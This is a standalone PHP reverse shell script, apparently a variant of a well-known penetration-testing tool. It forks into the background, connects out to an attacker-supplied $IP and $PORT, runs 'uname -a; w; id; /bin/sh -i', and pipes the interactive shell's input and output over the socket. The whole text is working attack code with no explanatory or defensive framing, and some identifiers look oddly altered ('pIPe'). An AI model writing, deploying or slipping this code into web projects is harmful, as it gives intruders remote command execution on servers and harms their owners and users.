set_time_limit (0);
$VERSION = "1.0";
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($IP, $PORT, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descrIPtorspec = array(
   0 => array("pIPe", "r"),  // stdin is a pIPe that the child will read from
   1 => array("pIPe", "w"),  // stdout is a pIPe that the child will write to
   2 => array("pIPe", "w")   // stderr is a pIPe that the child will write to
);

$process = proc_open($shell, $descrIPtorspec, $pIPes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pIPes[0], 0);
stream_set_blocking($pIPes[1], 0);
stream_set_blocking($pIPes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $IP:$PORT");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pIPes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pIPes[1], $pIPes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pIPes[0], $input);
	}

	if (in_array($pIPes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pIPes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pIPes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pIPes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pIPes[0]);
fclose($pIPes[1]);
fclose($pIPes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}